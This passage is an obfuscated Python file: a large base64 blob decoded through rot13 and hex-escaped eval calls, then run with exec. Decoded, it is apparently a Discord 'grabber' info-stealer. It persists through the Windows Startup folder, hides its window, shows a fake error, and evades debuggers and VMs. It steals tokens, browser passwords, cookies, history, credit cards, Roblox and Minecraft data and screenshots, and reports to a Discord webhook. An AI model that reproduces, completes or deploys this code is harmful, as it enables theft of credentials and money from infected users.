CAgc2VsZi5pcCwgc2VsZi5jaXR5LCBzZWxmLmNvdW50cnksIHNlbGYucmVnaW9uLCBzZWxmLm9yZywgc2VsZi5sb2MsIHNlbGYuZ29vZ2xlbWFwID0gbmV0WzBdLCBuZXRbMV0sIG5ldFsyXSwgbmV0WzNdLCBuZXRbNF0sIG5ldFs1XSwgbmV0WzZdCgogICAgICAgIHNlbGYuc3J0dXBsMGMgPSBudHBhdGguam9pbihzZWxmLnJvYW1pbmcsICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJywgJ1N0YXJ0dXAnKQoKICAgICAgICBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjID0gImFwaS93ZWJob29rcyIKCiAgICAgICAgc2VsZi5jaHJtcmd4ID0gcmUuY29tcGlsZShyJyhecHJvZmlsZVxzXGQqKXxkZWZhdWx0fChndWVzdCBwcm9maWxlJCknLCByZS5JR05PUkVDQVNFIHwgcmUuTVVMVElMSU5FKTsKICAgICAgICAKICAgICAgICBzZWxmLmJhc2V1cmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lIgoKICAgICAgICBzZWxmLnJlZ2V4ID0gY2xlYXJfcmVnCgogICAgICAgIHNlbGYuZW5jcnlwdGVkX3JlZ2V4ID0gciJkUXc0dzlXZ1hjUTpbXlwiXSoiCgogICAgICAgIHNlbGYudG9rZW5zID0gW10KCiAgICAgICAgc2VsZi5iY19pZCA9IFtdCgogICAgICAgIHNlbGYuc2VwID0gb3Muc2VwOwoKICAgICAgICBzZWxmLnJvYmxveGNvb2tpZXMgPSBbXTsKCiAgICAgICAgc2VsZi5jaHJvbWVfa2V5ID0gc2VsZi5ndG1rM3kobnRwYXRoLmpvaW4oc2VsZi5jaHJtbXVzZXJkdHQsICJMb2NhbCBTdGF0ZSIpKTsKCgogICAgICAgIG9zLm1ha2VkaXJzKHNlbGYuZGlyLCBleGlzdF9vaz1UcnVlKTsKCgogICAgCgoKICAgIGRlZiBlcnJvcl9yZW1vdGUoc2VsZjogc3RyKSAtPiBzdHI6CiAgICAgICAgaWYgc2VsZi5mYWtlX2Vycm9yID09ICJ5ZXMiOgogICAgICAgICAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5NZXNzYWdlQm94VyhOb25lLCAnRXJyb3IgY29kZTogV2luZG93c18weDk4ODk1OFxuU29tZXRoaW5nIGdvbmUgd3JvbmcuJywgJ0ZhdGFsIEVycm9yJywgMCkKCiAgICBkZWYgcGluZ19vbl9ydW5uaW5nKHNlbGY6IHN0cikgLT4gc3RyOgogICAgICAgIHBpbmcxID0gewogICAgICAgICAgICAnYXZhdGFyX3VybCc6ICdodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzEwODk2MTIwNDU4MDYyMTkzODQvMTA4OTYxMjU3NTE3NzcwNzUyMC9pbWFnZS5wbmc/d2lkdGg9MTE3MCZoZWlnaHQ9MTE3MCcsCiAgICAgICAgICAgICdjb250ZW50JzogIkBldmVyeW9uZSIKICAgICAgICAgICAgfQogICAgICAgIHBpbmcyID0gewogICAgICAgICAgICAnYXZhdGFyX3VybCc6ICdodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzEwODk2MTIwNDU4MDYyMTkzODQvMTA4OTYxMjU3NTE3NzcwNzUyMC9pbWFnZS5wbmc/d2lkdGg9MTE3MCZoZWlnaHQ9MTE3MCcsCiAgICAgICAgICAgICdjb250ZW50JzogIkBoZXJlIgogICAgICAgICAgICB9CiAgICAgICAgaWYgc2VsZi5waW5nb25ydW4gPT0gInllcyI6CiAgICAgICAgICAgIGlmIHNlbGYucmVnZXhfd2ViaG9va19kc2MgaW4gc2VsZi5kaXNjb3JkX3dlYmhvb2s6CiAgICAgICAgICAgICAgICBpZiBzZWxmLnBpbmd0eXBlID09ICJAZXZlcnlvbmUiIG9yIHNlbGYucGluZ3R5cGUgPT0gImV2ZXJ5b25lIjoKICAgICAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBqc29uPXBpbmcxKQogICAgICAgICAgICBpZiBzZWxmLnBpbmd0eXBlID09ICJAaGVyZSIgb3Igc2VsZi5waW5ndHlwZSA9PSAiaGVyZSI6CiAgICAgICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rIDoKICAgICAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBqc29uPXBpbmcyKQoKCgogICAgZGVmIHN0YXJ0dXBibGFja2NhcChzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBpZiBzZWxmLnN0YXJ0dXBleGUgPT0gInllcyI6CiAgICAgICAgICAgIHN0YXJ0dXBfcGF0aCA9IG9zLmdldGVudigiYXBwZGF0YSIpICsgIlxcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcIgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzdGFydHVwX3BhdGggKyBhcmd2WzBdKToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzdGFydHVwX3BhdGggKyBhcmd2WzBdKQogICAgICAgICAgICAgICAgY29weTIoYXJndlswXSwgc3RhcnR1cF9wYXRoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29weTIoYXJndlswXSwgc3RhcnR1cF9wYXRoKQoKCiAgICAgICAgICAgICAgICAKICAgIGRlZiBoaWRldGhpcyhzZWxmOiBzdHIpIC0+IHN0cjoKICAgICAgICBpZiBzZWxmLmhpZGUgPT0gInllcyI6CiAgICAgICAgICAgIGhpZGUgPSB3aW4zMmd1aS5HZXRGb3JlZ3JvdW5kV2luZG93KCkKICAgICAgICAgICAgd2luMzJndWkuU2hvd1dpbmRvdyhoaWRlLCB3aW4zMmNvbi5TV19ISURFKQoKCgoKICAgIGRlZiBiY19leGl0X3RoaXMoc2VsZik6CiAgICAgICAgc2h1dGlsLnJtdHJlZShzZWxmLmRpciwgaWdub3JlX2Vycm9ycz1UcnVlKQogICAgICAgIG9zLl9leGl0KDApCgogICAgZGVmIGV4dHJhY3RfdHJ5KGZ1bmMpOgogICAgICAgICcnJ0RlY29yYXRvciB0byBzYWZlbHkgY2F0Y2ggYW5kIGlnbm9yZSBleGNlcHRpb25zJycnCiAgICAgICAgZGVmIHdyYXBwZXIoKmFyZ3MsICoqa3dhcmdzKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgcmV0dXJuIHdyYXBwZXIKCiAgICBhc3luYyBkZWYgaW5pdChzZWxmKToKICAgICAgICBzZWxmLmJyb3dzZXJzID0gewogICAgICAgICAgICAnYW1pZ28nOiBzZWxmLmFwcGRhdGEgKyAnXFxBbWlnb1xcVXNlciBEYXRhJywKICAgICAgICAgICAgJ3RvcmNoJzogc2VsZi5hcHBkYXRhICsgJ1xcVG9yY2hcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdrb21ldGEnOiBzZWxmLmFwcGRhdGEgKyAnXFxLb21ldGFcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdvcmJpdHVtJzogc2VsZi5hcHBkYXRhICsgJ1xcT3JiaXR1bVxcVXNlciBEYXRhJywKICAgICAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnN3N0YXInOiBzZWxmLmFwcGRhdGEgKyAnXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdzcHV0bmlrJzogc2VsZi5hcHBkYXRhICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhJywKICAgICAgICAgICAgJ3ZpdmFsZGknOiBzZWxmLmFwcGRhdGEgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnZ29vZ2xlLWNocm9tZS1zeHMnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZSBTeFNcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdnb29nbGUtY2hyb21lJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdlcGljLXByaXZhY3ktYnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXEVwaWMgUHJpdmFjeSBCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnbWljcm9zb2Z0LWVkZ2UnOiBzZWxmLmFwcGRhdGEgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YScsCiAgICAgICAgICAgICd1cmFuJzogc2VsZi5hcHBkYXRhICsgJ1xcdUNvek1lZGlhXFxVcmFuXFxVc2VyIERhdGEnLAogICAgICAgICAgICAneWFuZGV4Jzogc2VsZi5hcHBkYXRhICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnYnJhdmUnOiBzZWxmLmFwcGRhdGEgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGEnLAogICAgICAgICAgICAnaXJpZGl1bSc6IHNlbGYuYXBwZGF0YSArICdcXElyaWRpdW1cXFVzZXIgRGF0YScsCiAgICAgICAgICAgICdlZGdlJzogc2VsZi5hcHBkYXRhICsgIlxcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGEiCgogICAgICAgIH0gICAgICAgIAogICAgICAgIHNlbGYucHJvZmlsZXMgPSBbCiAgICAgICAgICAgICdEZWZhdWx0JywKICAgICAgICAgICAgJ1Byb2ZpbGUgMScsCiAgICAgICAgICAgICdQcm9maWxlIDInLAogICAgICAgICAgICAnUHJvZmlsZSAzJywKICAgICAgICAgICAgJ1Byb2ZpbGUgNCcsCiAgICAgICAgICAgICdQcm9maWxlIDUnLAogICAgICAgIF0KCiAgICAgICAgaWYgc2VsZi5kaXNjb3JkX3dlYmhvb2sgPT0gIiIgb3Igc2VsZi5kaXNjb3JkX3dlYmhvb2sgPT0gIlx4NTdFQkhPT0tfSEVSRSI6CiAgICAgICAgICAgIHNlbGYuYmNfZXhpdF90aGlzKCkKICAgICAgICAgICAgCiAgICAgICAgc2VsZi5oaWRldGhpcygpCiAgICAgICAgc2VsZi5lcnJvcl9yZW1vdGUoKQogICAgICAgIHNlbGYuc3RhcnR1cGJsYWNrY2FwKCkKCiAgICAgICAgaWYgc2VsZi5mZXRjaF9jb25mKCdkYnVna2lsbGVyJykgYW5kIE5vRGVidWdnKCkuaW5WTSBpcyBUcnVlOgogICAgICAgICAgICBzZWxmLmJjX2V4aXRfdGhpcygpCiAgICAgICAgYXdhaXQgc2VsZi5ieXBhc3NfYnR0ZHNjKCkKICAgICAgICBhd2FpdCBzZWxmLmJ5cGFzc190b2tlbnBydGN0KCkKCiAgICAgICAgZnVuY3Rpb25fbGlzdCA9IFtzZWxmLnN0ZWFsX3NjcmVlbiwgc2VsZi5zeXN0ZW1faW5mb3JtYXRpb25zLCBzZWxmLnN0ZWFsX3Rva2VuLCBzZWxmLmdyYWJiX21jLCBzZWxmLmdyYWJiX3JvYmxveF0KCgogICAgICAgIGlmIHNlbGYuZmV0Y2hfY29uZigna2lsbF9kaXNjb3JkX3Byb2Nlc3MnKToKCiAgICAgICAgICAgIGF3YWl0IHNlbGYua2lsbF9wcm9jZXNzX2lkKCkKCgoKICAgICAgICBvcy5tYWtlZGlycyhudHBhdGguam9pbihzZWxmLmRpciwgJ0Jyb3dzZXJzJyksIGV4aXN0X29rPVRydWUpCiAgICAgICAgZm9yIG5hbWUsIHBhdGggaW4gc2VsZi5icm93c2Vycy5pdGVtcygpOgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2RpcihwYXRoKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICBzZWxmLm1hc3RlcmtleSA9IHNlbGYuZ3RtazN5KHBhdGggKyAnXFxMb2NhbCBTdGF0ZScpCiAgICAgICAgICAgIHNlbGYuZnVuY3MgPSBbCiAgICAgICAgICAgICAgICBzZWxmLnN0ZWFsX2Nvb2tpZXMyLAogICAgICAgICAgICAgICAgc2VsZi5zdGVhbF9oaXN0b3J5MiwKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfcGFzc3dvcmRzMiwKICAgICAgICAgICAgICAgIHNlbGYuc3RlYWxfY2MyCiAgICAgICAgICAgIF0KCiAgICAgICAgICAgIGZvciBwcm9maWxlIGluIHNlbGYucHJvZmlsZXM6CiAgICAgICAgICAgICAgICBmb3IgZnVuYyBpbiBzZWxmLmZ1bmNzOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgZnVuYyhuYW1lLCBwYXRoLCBwcm9maWxlKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAKICAgICAgICBpZiBudHBhdGguZXhpc3RzKHNlbGYuY2hybW11c2VyZHR0KSBhbmQgc2VsZi5jaHJvbWVfa2V5IGlzIG5vdCBOb25lOgogICAgICAgICAgICBvcy5tYWtlZGlycyhudHBhdGguam9pbihzZWxmLmRpciwgJ0d'
love = ''
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))